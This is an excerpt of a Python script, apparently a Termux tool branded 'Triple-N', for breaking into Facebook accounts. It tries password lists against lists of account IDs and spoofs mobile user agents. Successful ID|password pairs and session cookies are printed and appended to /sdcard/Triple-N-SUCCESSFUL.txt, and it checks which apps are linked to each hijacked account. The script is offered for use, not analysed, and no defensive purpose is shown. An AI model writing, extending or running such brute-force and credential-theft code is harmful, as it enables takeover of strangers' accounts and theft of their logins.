...
for xd in range(10000):
	...
	ugen2.append(uaku)
#Mozilla/5.0 (Linux; Android 11; Redmi K20 Pro Premium Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111;]	

	aa='Mozilla/5.0 (Linux; Android 11; Redmi K20 Pro Premium Edition Build/RKQ1.200826.002; wv)'
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/TripleN420/nina420ksrb/blob/main/nina%20server.txt').text
		ua=open('.ua2.txt','w')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'Anin' and password == 'Nahin@@1122':
...
def banner1():
 ...
 \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;32m YOUR OK ID SAVED IN : \033[1;33m/sdcard/Triple-N-OK.TXT
...
def cek_apk(kuki):
 ...
 try:
  for i in range(len(game)):
   print ("\r%s  \033[0m    ==> %s%s"%(P,H,game[i].replace("Added to"," Added to")))
...
def login():
	banner()
	hack()
	print('\033[1;92m[01] START PROCESS\n[02] CONTACT WITH ADMIN\n[03] REFRESH SERVER \n[00] \033[0;92mEXIT ')
	hack()
	Nahin = input('\x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m SELECT: ');time.sleep(0.01)
	if Nahin in ['3']:
		os.system('touch .prox.txt')
		os.system("clear")
		time.sleep(1.4)
		print ("\033[1;33mSERVER REFRESH DONE NOW RUN TOOLS AGAIN")
	elif Nahin in ['1','01']:
		crack_file()
	elif Nahin in ['i','0i']:
		result()
	elif Nahin in ['2','02']:
		os.system('xdg-open https://www.facebook.com/profile.php?id=61550530814340')
	elif Nahin in ['0']:
...
def crack_file():
	...
	o = input(' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m INPUT PATH : ')
	print('')
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			...
			id2.insert(xx,bacot)
	print(' [A] METHOD A')
	#print('\x1b[1;92m [B] METHOD B \x1b[1;93m(WITH APK)')
	
	 
	print ("")
	hc = input(' \x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m SELECT: ')
	if hc in ['a','A']:
...
def passwrd():
	...
	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)));os.system('clear');banner()
	...
	print('')
	hack ()
	print(f'CHECKPOINT : %s '%(cp))
	print(f'SUCCESSFUL : {h}%s '%(ok))
	hack ()
	exit ()
...
def crack(idf,pwv):
	...
	#sys.stdout.write('\r\033[1;97m[ Triple-N ] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
	sys.stdout.write(f"\r\033[1;97m[ Triple-N ] {loop} | {len(id)} \033[1;92m{ok} \033[1;97m| \033[1;91m{cp} "),
	sys.stdout.flush()
	ua5, merk = user_agent()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\033[1;33m[Triple-N] {idf} ✓ {pw} | {ua}')
				...
				print(f'\r\033[1;32m[Triple-N-OK] {idf} ✓ {pw} | {kuki}')
				cek_apk(kuki)
				#print (f"\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;32m COOKIES==>  {ua}")
				...
				open(f'/sdcard/Triple-N-SUCCESSFUL.txt','a').write(idf+'|'+pw+'\n')
				
				#open('/sdcard/Triple-N/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
